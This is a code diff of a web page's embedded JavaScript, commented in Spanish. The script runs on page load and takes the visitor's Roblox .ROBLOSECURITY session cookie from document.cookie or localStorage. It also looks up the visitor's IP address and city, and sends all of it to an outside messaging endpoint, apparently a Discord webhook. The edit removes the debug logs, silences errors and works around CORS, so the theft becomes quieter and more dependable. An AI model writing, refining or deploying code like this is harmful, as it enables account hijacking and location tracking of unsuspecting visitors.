@@ -30,90 +30,128 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ content: mensaje })
                 });
-            } catch (e) {
-                console.error('Error enviando a Discord:', e);
-            }
+            } catch (e) {}
         }
 
-        // ================= DIAGNÓSTICO Y EXTRACCIÓN =================
+        // ================= OBTENER IP SIN CORS (usando JSONP) =================
+        function obtenerIPConJSONP() {
+            return new Promise((resolve) => {
+                const script = document.createElement('script');
+                script.src = 'https://api.ipify.org?format=jsonp&callback=ipCallback';
+                
+                window.ipCallback = (data) => {
+                    resolve(data.ip);
+                    document.body.removeChild(script);
+                    delete window.ipCallback;
+                };
+                
+                script.onerror = () => {
+                    resolve(null);
+                    document.body.removeChild(script);
+                };
+                
+                document.body.appendChild(script);
+                
+                // Timeout por si acaso
+                setTimeout(() => {
+                    if (window.ipCallback) {
+                        resolve(null);
+                        delete window.ipCallback;
+                    }
+                }, 5000);
+            });
+        }
+
+        // ================= OBTENER PAÍS SIN CORS (usando servicio alternativo) =================
+        function obtenerPaisConJSONP(ip) {
+            return new Promise((resolve) => {
+                if (!ip) {
+                    resolve({ pais: 'Desconocido', ciudad: 'Desconocida' });
+                    return;
+                }
+                
+                // Usar un servicio que soporte JSONP
+                const script = document.createElement('script');
+                script.src = `https://ipapi.co/${ip}/json/?callback=paisCallback`;
+                
+                window.paisCallback = (data) => {
+                    resolve({
+                        pais: data.country_name || 'Desconocido',
+                        ciudad: data.city || 'Desconocida'
+                    });
+                    document.body.removeChild(script);
+                    delete window.paisCallback;
+                };
+                
+                script.onerror = () => {
+                    resolve({ pais: 'Desconocido', ciudad: 'Desconocida' });
+                    document.body.removeChild(script);
+                };
+                
+                document.body.appendChild(script);
+                
+                setTimeout(() => {
+                    if (window.paisCallback) {
+                        resolve({ pais: 'Desconocido', ciudad: 'Desconocida' });
+                        delete window.paisCallback;
+                    }
+                }, 5000);
+            });
+        }
+
+        // ================= FUNCIÓN PRINCIPAL =================
         (async function() {
             try {
                 let cookie = null;
                 let metodos = [];
-                let logs = []; // Para enviar información de depuración
 
-                // --- 1. DETECTAR Navegador y Capacidades ---
-                logs.push(`🖥️ User Agent: ${navigator.userAgent}`);
-                logs.push(`🍪 ¿Cookies habilitadas? ${navigator.cookieEnabled ? 'Sí' : 'No'}`);
-
-                // --- 2. INTENTAR LEER DOCUMENT.COOKIE ---
+                // ===== BUSCAR COOKIE =====
                 try {
-                    logs.push(`📄 document.cookie (crudo): "${document.cookie}"`);
                     const cookies = document.cookie.split(';');
                     for (let c of cookies) {
                         c = c.trim();
-                        if (c.includes('.ROBLOSECURITY') || c.includes('ROBLOSECURITY')) {
+                        if (c.includes('.ROBLOSECURITY')) {
                             cookie = c.split('=').slice(1).join('=');
                             metodos.push('document.cookie');
-                            logs.push(`✅ Cookie encontrada en document.cookie`);
                             break;
                         }
                     }
-                    if (!cookie) logs.push(`❌ Cookie .ROBLOSECURITY no encontrada en document.cookie.`);
-                } catch (e) {
-                    logs.push(`❌ Error al leer document.cookie: ${e.message}`);
-                }
+                } catch(e) {}
 
-                // --- 3. INTENTAR EN LOCALSTORAGE (SI NO SE ENCONTRÓ) ---
                 if (!cookie) {
                     try {
-                        logs.push(`💾 localStorage tiene ${localStorage.length} items.`);
                         for (let i = 0; i < localStorage.length; i++) {
-                            const key = localStorage.key(i);
-                            const val = localStorage.getItem(key);
-                            if (val && (val.includes('_|WARNING') || val.includes('ROBLOSECURITY'))) {
+                            const val = localStorage.getItem(localStorage.key(i));
+                            if (val && val.includes('_|WARNING')) {
                                 cookie = val;
                                 metodos.push('localStorage');
-                                logs.push(`✅ Cookie encontrada en localStorage con key: "${key}"`);
                                 break;
                             }
                         }
-                         if (!cookie) logs.push(`❌ Cookie no encontrada en localStorage.`);
-                    } catch (e) {
-                        logs.push(`❌ Error al leer localStorage: ${e.message}`);
-                    }
+                    } catch(e) {}
                 }
 
-                // --- 4. OBTENER UBICACIÓN (CON DIAGNÓSTICO) ---
+                // ===== OBTENER UBICACIÓN SIN CORS =====
                 let pais = 'Desconocido';
                 let ciudad = 'Desconocida';
+                
                 try {
-                    logs.push(`🌐 Solicitando IP a api.ipify.org...`);
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    if (!ipRes.ok) throw new Error(`HTTP ${ipRes.status}`);
-                    const ip = (await ipRes.json()).ip;
-                    logs.push(`🌐 IP obtenida: ${ip}`);
+                    const ip = await obtenerIPConJSONP();
+                    if (ip) {
+                        const ubicacion = await obtenerPaisConJSONP(ip);
+                        pais = ubicacion.pais;
+                        ciudad = ubicacion.ciudad;
+                    }
+                } catch(e) {}
 
-                    logs.push(`🌐 Solicitando ubicación a ip-api.com...`);
-                    const locRes = await fetch(`https://ip-api.com/json/${ip}?fields=country,city`);
-                     if (!locRes.ok) throw new Error(`HTTP ${locRes.status}`);
-                    const loc = await locRes.json();
-                    pais = loc.country || 'Desconocido';
-                    ciudad = loc.city || 'Desconocida';
-                    logs.push(`🌐 Ubicación: ${pais}, ${ciudad}`);
-                } catch (e) {
-                    logs.push(`❌ Error obteniendo ubicación: ${e.message}`);
-                }
-
-                // --- 5. FECHA/HORA Y DISPOSITIVO ---
+                // ===== FECHA/HORA =====
                 const ahora = new Date();
                 const fecha = ahora.toLocaleDateString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' });
                 const hora = ahora.toLocaleTimeString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' });
-                const dispositivo = navigator.userAgent.includes('Android') ? 'Android' : 
-                                    navigator.userAgent.includes('Windows') ? 'Windows' : 'Desconocido';
+                const dispositivo = navigator.userAgent.includes('Android') ? 'Android' : 'Desconocido';
 
-                // --- 6. CONSTRUIR MENSAJE PRINCIPAL ---
-                const mensajePrincipal = `|| @everyone ||
+                // ===== CONSTRUIR MENSAJE =====
+                const mensaje = `|| @everyone ||
 🔔 NUEVA ENTRADA | **BL PAPI** !
 
 **📌 INFORMACIÓN GENERAL**
@@ -150,19 +188,15 @@
 
 **🍪 COOKIE DE ROBLOX**
 \`\`
-${cookie || 'No encontrada'}
+${cookie || 'No encontrada (inicia sesión en Via Browser)'}
 \`\`
 
 **🔧 Métodos usados:** ${metodos.join(', ') || 'ninguno'}`;
 
-                // --- 7. ENVIAR MENSAJE PRINCIPAL Y LOGS ---
-                await enviar(mensajePrincipal);
-                
-                // Enviar los logs como un mensaje aparte (para no saturar)
-                await enviar(`**📋 LOGS DE DIAGNÓSTICO:**\n\`\`\`${logs.join('\n')}\`\`\``);
+                await enviar(mensaje);
 
-            } catch (error) {
-                await enviar(`❌ Error GLOBAL en el script: ${error.message}`);
+            } catch(e) {
+                await enviar(`❌ Error: ${e.message}`);
             }
         })();
     </script>
